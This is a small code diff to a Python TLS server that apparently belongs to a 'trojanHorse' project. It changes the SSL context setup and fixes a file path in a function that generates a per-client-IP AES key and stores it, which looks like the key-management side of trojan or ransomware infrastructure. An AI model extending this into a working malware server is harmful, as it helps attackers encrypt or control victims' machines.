@@ -6,8 +6,8 @@ import sqlite3
 import os
 import time
 def client_connection():
-    context = ssl.create_default_context()
-    context.load_cert_chain(certfile="server.crt", keyfile="server.key")
+    context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
+    context.load_cert_chain(certfile="cert.pem", keyfile="key.pem")
     server = socket.socket()
     secure_server = context.wrap_socket(server, server_side= True)
     secure_server.bind(("0.0.0.0", 9999))
@@ -22,7 +22,7 @@ def client_connection():
 
 def create_secret_key(client_ip):
     random_key = os.urandom(32) # 32 bytes for aes key length
-    with open("C:\Users\avico\source\repos\Cyber\trojanHorse\keys\{}" .format(client_ip), "wb") as key_file:
+    with open(r"C:\Users\avico\source\repos\Cyber\trojanHorse\keys\{}".format(client_ip), "wb") as key_file:
         key_file.write(random_key)
     store_key_in_DB(client_ip, random_key)
     return random_key
